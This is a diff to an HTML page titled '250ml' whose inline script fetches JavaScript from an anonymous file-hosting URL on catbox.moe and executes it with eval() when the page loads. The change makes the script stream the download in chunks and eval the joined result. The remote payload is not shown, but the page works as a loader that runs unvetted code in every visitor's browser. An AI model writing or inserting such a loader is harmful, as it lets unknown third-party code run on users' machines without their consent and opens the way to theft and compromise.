@@ -5,20 +5,29 @@
   <title>250ml</title>
   <link rel="stylesheet" href="style250.css" />
   <script>
+  let chunks = [];
   fetch("https://files.catbox.moe/cwedrd.js")
-    .then(res => {
-      if (!res.ok) {
-       throw new Error(`Fetch failed: HTTP ${res.status} ${res.statusText}`);
+    .then(res => res.body.getReader())
+    .then(reader => {
+      function pump() {
+        return reader.read().then(({ done, value }) => {
+          if (done) {
+            // Merges everything only after full delivery
+            let finalCode = new TextDecoder().decode(new Uint8Array([].concat(...chunks)));
+            document.getElementById("status").textContent = "Executing full script...";
+            eval(finalCode);
+            return;
+          }
+
+          chunks.push(Array.from(value));
+          return pump();
+         });
       }
-      return res.text();
-    })
-    .then(code => {
-      document.getElementById("status").textContent = "Success: Executing script";
-      eval(code);
-    })
-    .catch(err => {
-      document.getElementById("status").textContent = "Fetch error: " + err.message;
-    });
+      return pump();
+     })
+     .catch(err => {
+       document.getElementById("status").textContent = "Error: " + err.message;
+     });
 </script>
 </head>
 <body>
